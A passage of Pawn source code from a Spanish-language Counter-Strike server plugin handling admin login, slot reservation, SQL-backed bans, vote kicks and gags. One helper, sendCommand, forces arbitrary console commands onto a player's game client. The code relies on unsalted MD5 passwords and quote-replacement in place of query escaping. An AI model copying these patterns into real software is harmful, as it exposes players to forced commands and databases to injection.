			if(string[i] != ' ') {
				return 1;
			}
		}
	}

	return 0;
}

public getUserFlood(const id, const TrackCommands:element) {
	new Float:flGameTime = get_gametime();

	if(flGameTime < Float:get_member(id, m_flLastCommandTime, element)) {
		return 1;
	}

	set_member(id, m_flLastCommandTime, Float:(flGameTime + 0.3), element);

	if(Float:get_member(id, m_flLastTalk) != 0.0 && ((flGameTime - Float:get_member(id, m_flLastTalk)) < 0.66)) {
		return 1;
	}

	set_member(id, m_flLastTalk, Float:flGameTime);
	return 0;
}

loadAdminAccess(const id, const name[]="", const ip[]="", const authid[]="") {
	remove_user_flags(id);

	new sPlayerName[MAX_NAME_LENGTH];
	new sPlayerIp[MAX_IP_WITH_PORT_LENGTH];
	new sPlayerSteamId[MAX_AUTHID_LENGTH];
	new i;
	new iAdminsNum = admins_num();
	new iFlags;
	new sAdminName[MAX_NAME_LENGTH];
	new iIndex = -1;

	copy(sPlayerName, charsmax(sPlayerName), name);
	copy(sPlayerIp, charsmax(sPlayerIp), ip);
	copy(sPlayerSteamId, charsmax(sPlayerSteamId), authid);

	for(i = 0; i < iAdminsNum; ++i) {
		iFlags = admins_lookup(i, AdminProp_Flags);
		admins_lookup(i, AdminProp_Auth, sAdminName, charsmax(sAdminName));

		if(iFlags & FLAG_TAG) {
			if(containi(sPlayerName, sAdminName) != -1) {
				iIndex = i;
				break;
			}
		} else if(equali(sPlayerName, sAdminName)) {
			iIndex = i;
			break;
		}
	}

	if(iIndex != -1) {
		new sAdminPassword[MAX_CHARACTER_MD5];
		new sAdminSetinfo[24];
		new sAdminSetinfoMd5[MAX_CHARACTER_MD5];

		admins_lookup(iIndex, AdminProp_Password, sAdminPassword, charsmax(sAdminPassword));
		get_user_info(id, "_pw", sAdminSetinfo, charsmax(sAdminSetinfo));
		hash_string(sAdminSetinfo, Hash_Md5, sAdminSetinfoMd5, charsmax(sAdminSetinfoMd5));

		if(equal(sAdminPassword, sAdminSetinfoMd5)) {
			new iAdmins[structAdmins];
			TrieGetArray(g_tAdmins, sAdminName, iAdmins, sizeof(iAdmins));

			if(iAdmins[adminForumId]) {
				formatex(g_AdminName[id], charsmax(g_AdminName[]), "%s", sAdminName);

				new iAccess;
				new sAccess[32];

				iAccess = admins_lookup(iIndex, AdminProp_Access);
				set_user_flags(id, iAccess);
				get_flags(iAccess, sAccess, charsmax(sAccess));

				log_amx("Inicio de sesión exitoso de <%s><%s><%s> ~~ <AdminName: %s><AdminAccess: %s><AdminForumId: %d>", sPlayerName, sPlayerIp, sPlayerSteamId, sAdminName, sAccess, iAdmins[adminForumId]);
			} else {
				log_amx("Inicio de sesión erroneo de <%s><%s><%s> ~~ <AdminName: %s> ~~ No vinculo su cuenta de foro con el beneficio", sPlayerName, sPlayerIp, sPlayerSteamId, sAdminName);
				rh_drop_client(id, "El nombre que intentas utilizar no está vinculado al foro correctamente. Por favor, contáctate con algún administrador para realizar dicha vinculación.");
			}
		} else {
			log_amx("Inicio de sesión erroneo de <%s><%s><%s> ~~ <AdminName: %s> ~~ Contraseña incorrecta", sPlayerName, sPlayerIp, sPlayerSteamId, sAdminName);
			rh_drop_client(id, fmt("El nombre que intentas utilizar está reservado para un jugador. Consigue tu reservación de TAG en el sitio web %s.", __PLUGIN_COMMUNITY_FORUM_SHOP));
		}
	} else {
		set_user_flags(id, read_flags("z"));
	}
}

public checkSlotReservation(const id) {
	loadAdminAccess(id, g_PlayerName[id], g_PlayerIp[id], g_PlayerSteamId[id]);

	new iPlayersNum = get_playersnum(1);
	new iMaxPlayers = (MaxClients - get_pcvar_num(g_pCvar_SlotReservation));

	switch(g_ServerId) {
		case SV_ZE, SV_ZR, SV_ZP: {
			if(iPlayersNum > iMaxPlayers) {
				if((get_user_flags(id) & ADMIN_RESERVATION)) {
					new i;
					new iPlayers[MAX_PLAYERS + 1];
					new iCount = -1;
					new iRandomUser;

					for(i = 1; i <= MaxClients; ++i) {
						if(is_user_connecting(i) || !is_user_connected(i) || (get_user_flags(i) & ADMIN_RESERVATION) || is_user_bot(i) || is_user_hltv(i)) {
							continue;
						}

						iPlayers[++iCount] = i;
					}

					iRandomUser = iPlayers[random_num(0, iCount)];

					if(is_user_connected(iRandomUser)) {
						rh_drop_client(iRandomUser, fmt("Una cuenta VIP ha ocupado tu lugar. Consigue tu Slot reservado en %s.", __PLUGIN_COMMUNITY_FORUM_SHOP));
					}
				} else {
					rh_drop_client(id, fmt("Servidor lleno; consigue tu Slot reservado en nuestra web: %s.", __PLUGIN_COMMUNITY_FORUM_SHOP));
				}
			}
		} default: {
			if((get_user_flags(id) & ADMIN_RESERVATION) || (iPlayersNum <= iMaxPlayers)) {
				return;
			}

			rh_drop_client(id, fmt("Servidor lleno; consigue tu Slot reservado en nuestra web: %s.", __PLUGIN_COMMUNITY_FORUM_SHOP));
		}
	}
}

public getUserAdminId(const id) {
	new iAdmins[structAdmins];
	TrieGetArray(g_tAdmins, g_AdminName[id], iAdmins, sizeof(iAdmins));

	return iAdmins[adminId];
}

public getUserForumId(const id) {
	new iAdmins[structAdmins];
	TrieGetArray(g_tAdmins, g_AdminName[id], iAdmins, sizeof(iAdmins));

	if(iAdmins[adminForumId] <= 0) { // Si no se encuentra un ID de foro, se otorga el ID del BOT del foro.
		return 9;
	}

	return iAdmins[adminForumId];
}

public getUserTimeBan(const minutes, output[], const output_len) {
	new iMinutes = minutes;
	new iHours = 0;
	new iDays = 0;

	while(iMinutes >= 60) {
		iMinutes -= 60;
		++iHours;
	}

	while(iHours >= 24) {
		iHours -= 24;
		++iDays;
	}

	new iAdd = 0;

	if(iMinutes) {
		formatex(output, output_len, "%d minuto%s", iMinutes, ((iMinutes != 1) ? "s" : ""));
		iAdd = 1;
	}

	if(iHours) {
		if(iAdd) {
			format(output, output_len, "%d hora%s, %s", iHours, ((iHours != 1) ? "s" : ""), output);
		} else {
			formatex(output, output_len, "%d hora%s", iHours, ((iHours != 1) ? "s" : ""));
			iAdd = 1;
		}
	}

	if(iDays) {
		if(iAdd) {
			format(output, output_len, "%d día%s, %s", iDays, ((iDays != 1) ? "s" : ""), output);
		} else {
			formatex(output, output_len, "%d día%s", iDays, ((iDays != 1) ? "s" : ""));
			iAdd = 1;
		}
	}

	if(!iAdd) {
		copy(output, output_len, "permanente");
	}
}

public addBan(const id, const admin_name[], const admin_authid[], const user_name[], const user_authid[], const start, const minutes, const finish, const reason[]) {
	new sAdminNameSafe[MAX_NAME_LENGTH];
	new sUserNameSafe[MAX_NAME_LENGTH];
	new sReasonSafe[64];
	new iAdminId = getUserAdminId(id);
	new iForumId = getUserForumId(id);
	new Handle:sqlQuery;

	sqlStringSafe(admin_name, sAdminNameSafe, charsmax(sAdminNameSafe));
	sqlStringSafe(user_name, sUserNameSafe, charsmax(sUserNameSafe));
	sqlStringSafe(reason, sReasonSafe, charsmax(sReasonSafe));

	sqlQuery = SQL_PrepareQuery(g_SqlConnection, "INSERT INTO `gral_bans` (`admin_id`, `admin_name`, `admin_authid`, `user_name`, `user_authid`, `start`, `minutes`, `finish`, `reason`, `forum_id`, `server_id`, `active`) VALUES ('%d', ^"%s^", ^"%s^", ^"%s^", ^"%s^", '%d', '%d', '%d', ^"%s^", '%d', '%d', '1');", iAdminId, sAdminNameSafe, admin_authid, sUserNameSafe, user_authid, start, minutes, finish, sReasonSafe, iForumId, g_ServerId);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(id, sqlQuery, 15);
	} else {
		SQL_FreeHandle(sqlQuery);
	}
}

public sqlStringSafe(const input[], output[], const output_len) {
	copy(output, output_len, input);

	replace_all(output, output_len, "'", "*");
	replace_all(output, output_len, "^"", "*");
	replace_all(output, output_len, "`", "*");
}

public showBanInfo(const id, const admin_name[], const admin_authid[], const user_name[], const user_authid[], const start, const minutes, const finish, const reason[], const show_admin, const show_website) {
	new sTimeBan[32];
	getUserTimeBan(minutes, sTimeBan, charsmax(sTimeBan));

	if(id) {
		client_cmd(id, "echo ^"************************************************^"");
		if(show_admin && show_website) {
			client_cmd(id, "echo ^"Te han baneado del servidor %s^"", getServerName(.with_numeral=1));
			client_cmd(id, "echo ^"^"");
		}
		client_cmd(id, "echo ^"Nombre del Baneado: %s^"", user_name);
		client_cmd(id, "echo ^"%s: %s^"", ((user_authid[0] == 'S') ? "SteamId del baneado" : "IP del baneado"), user_authid);
		client_cmd(id, "echo ^"Tiempo de ban: %s^"", sTimeBan);
		client_cmd(id, "echo ^"^"");
		if(show_admin) {
			client_cmd(id, "echo ^"Administrador: %s^"", admin_name);
		}
		client_cmd(id, "echo ^"Fecha de Inicio del ban: %s^"", getUnixToTime(start));
		client_cmd(id, "echo ^"Fecha de Finalización del ban: %s^"", getUnixToTime(finish));
		client_cmd(id, "echo ^"Razón del ban: %s^"", reason);
		if(show_website) {
			client_cmd(id, "echo ^"^"");
			client_cmd(id, "echo ^"Si piensas que el ban está mal dado, visita nuestra sección^"");
			client_cmd(id, "echo ^"de quejas en nuestro foro: %s^"", __PLUGIN_COMMUNITY_FORUM);
		}
		client_cmd(id, "echo ^"************************************************^"");
	} else {
		server_print("************************************************");
		if(show_admin) {
			server_print("Han baneado a un jugador en el servidor %s", getServerName(.with_numeral=1));
			server_print("");
		}
		server_print("Nombre del Baneado: %s", user_name);
		server_print("%s: %s", ((user_authid[0] == 'S') ? "SteamId del baneado" : "IP del baneado"), user_authid);
		server_print("Tiempo de ban: %s", sTimeBan);
		server_print("");
		if(show_admin) {
			server_print("Administrador: %s", admin_name);
		}
		server_print("Fecha de Inicio del ban: %s", getUnixToTime(start));
		server_print("Fecha de Finalización del ban: %s", getUnixToTime(finish));
		server_print("Razón del ban: %s", reason);
		server_print("************************************************");
	}
}

public removeBan(const user_authid[]) {
	new Handle:sqlQuery = SQL_PrepareQuery(g_SqlConnection, "UPDATE `gral_bans` SET `active`='0' WHERE (`user_authid`=^"%s^" AND `server_id`='%d' AND `active`='1');", user_authid, g_ServerId);

	if(!SQL_Execute(sqlQuery)) {
		executeQuery(0, sqlQuery, 16);
	} else {
		SQL_FreeHandle(sqlQuery);
	}
}

public checkVoteUsers(const vote_id, const vote_user) {
	if(is_user_connected(vote_id) && is_user_connected(vote_user) && g_VoteUser_AlreadyVote[vote_id] && g_VoteUser_Votes[vote_user] > 0) {
		new iMinPlaying = (getUsersPlaying(TEAM_TERRORIST) + getUsersPlaying(TEAM_CT));
		new iVotesNeeded = ((iMinPlaying * VOTEUSER_PERCENT) / 100);

		if(iMinPlaying == 2) {
			++iVotesNeeded;
		}

		if(g_VoteUser_Votes[vote_user] >= iVotesNeeded) {
			rh_drop_client(vote_user, fmt("Has sido expulsado porque %d jugador%s te vot%s.", g_VoteUser_Votes[vote_user], ((g_VoteUser_Votes[vote_user] != 1) ? "es" : ""), ((g_VoteUser_Votes[vote_user] != 1) ? "taron" : "ò")));
		}
	}
}

public setNextMap(const map[]) {
	new sMap[MAX_CHARACTER_MAPNAME];
	copy(sMap, charsmax(sMap), map);
	strtolower(sMap);

	if(!is_map_valid(sMap)) {
		formatex(sMap, charsmax(sMap), "de_dust2");
	}

	set_cvar_string("amx_nextmap", sMap);

	message_begin(MSG_ALL, SVC_INTERMISSION);
	message_end();

	remove_task(TASK_CHANGEMAP);
	set_task(floatmax(get_cvar_float("mp_chattime"), 2.0), "task__ChangeMap", TASK_CHANGEMAP, sMap, sizeof(sMap));
}

public sendCommand(const id, const command[]) {
	if(is_user_connected(id)) {
		message_begin(MSG_ONE, SVC_DIRECTOR, _, id);
		write_byte((strlen(command) + 2));
		write_byte(10);
		write_string(command);
		message_end();
	}
}

public checkGagOnDisconnect(const id) {
	if(g_Gag[id]) {
		remove_task(id + TASK_GAG);

		g_Gag[id] = 0;

		clientPrintColor(0, _, "El jugador amordazado (!t%n!y) se ha desconectado.", id);
	}
}

public getLastPlayersOnDisconnect(const id) {
	if(g_LastPlayers_Count >= MAX_LAST_PLAYERS) {
		g_LastPlayers_Count = 0;
	}

	copy(g_LastPlayers_Name[g_LastPlayers_Count], charsmax(g_LastPlayers_Name[]), g_PlayerName[id]);
	copy(g_LastPlayers_Ip[g_LastPlayers_Count], charsmax(g_LastPlayers_Ip[]), g_PlayerIp[id]);
	copy(g_LastPlayers_SteamId[g_LastPlayers_Count], charsmax(g_LastPlayers_SteamId[]), g_PlayerSteamId[id]);
	g_LastPlayers_LastTime[g_LastPlayers_Count] = get_arg_systime();

	++g_LastPlayers_Count;
}

public checkVotesOnDisconnect(const id) {
	if(g_Vote_AlreadyVote[id]) {
		g_Vote_AlreadyVote[id] = 0;

		if(g_Vote_Id[id] >= 0) {
			--g_Vote_VoteCount[g_Vote_Id[id]];
			--g_Vote_MaxVotes;
		}
	}
}

public checkVotesUsersOnDisconnect(const id) {
	g_VoteUser_Votes[id] = 0;
	g_VoteUser_LastTime[id] = 0;

	if(g_VoteUser_AlreadyVote[id]) {
		new i;
		for(i = 0; i <= MaxClients; ++i) {
			if(g_VoteUser_LastVote[id][i] == get_user_userid(i)) {
				--g_VoteUser_Votes[i];
			}

			g_VoteUser_LastVote[id][i] = 0;
		}

		g_VoteUser_AlreadyVote[id] = 0;
	}
}

public native__GetUserAdminId(const id) {
	return getUserAdminId(id);
}

public native__GetUserForumId(const id) {
	return getUserForumId(id);
}

public native__GetUserMute(const id, const user) {
	if(!rg_get_can_hear_player(id, user)) {
		return 1;
	}

	return 0;
}

public native__GetServerId() {
	return g_ServerId;
}